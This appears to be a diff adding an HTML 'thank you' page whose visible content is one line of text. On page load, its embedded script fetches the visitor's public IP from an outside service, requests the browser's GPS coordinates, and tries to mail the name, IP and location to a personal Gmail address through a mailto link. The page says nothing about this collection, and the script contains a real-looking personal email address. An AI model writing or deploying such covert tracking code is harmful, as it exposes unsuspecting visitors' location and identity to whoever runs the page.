@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Thank You for Your Information</title>
+	<style>
+		body {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			height: 100vh;
+			margin: 0;
+			padding: 0;
+			font-size: 32px;
+			font-weight: bold;
+			text-align: center;
+		}
+	</style>
+</head>
+<body>
+	<p>Thank you for your information :)</p>
+	<script type="text/javascript">
+		var email = "joshcameronbruce@gmail.com";
+		function sendEmail(name, ip, gps) {
+			var subject = "Viewer Information";
+			var body = "Name (" + name + ")\nIP: " + ip + "\nGPS: " + gps;
+			window.location.href = "mailto:" + email + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+		}
+		function getIP(json) {
+			var ip = json.ip;
+			var name = (typeof username !== 'undefined' ? username : 'anonymous');
+			var gps = "";
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(function(position) {
+					var latitude = position.coords.latitude;
+					var longitude = position.coords.longitude;
+					gps = latitude + ', ' + longitude;
+					sendEmail(name, ip, gps);
+				});
+			} else {
+				sendEmail(name, ip, gps);
+			}
+			console.log('Name: ' + name + ', IP address: ' + ip + ', GPS location: ' + gps);
+		}
+		var script = document.createElement('script');
+		script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+		document.head.appendChild(script);
+	</script>
+</body>
+</html>
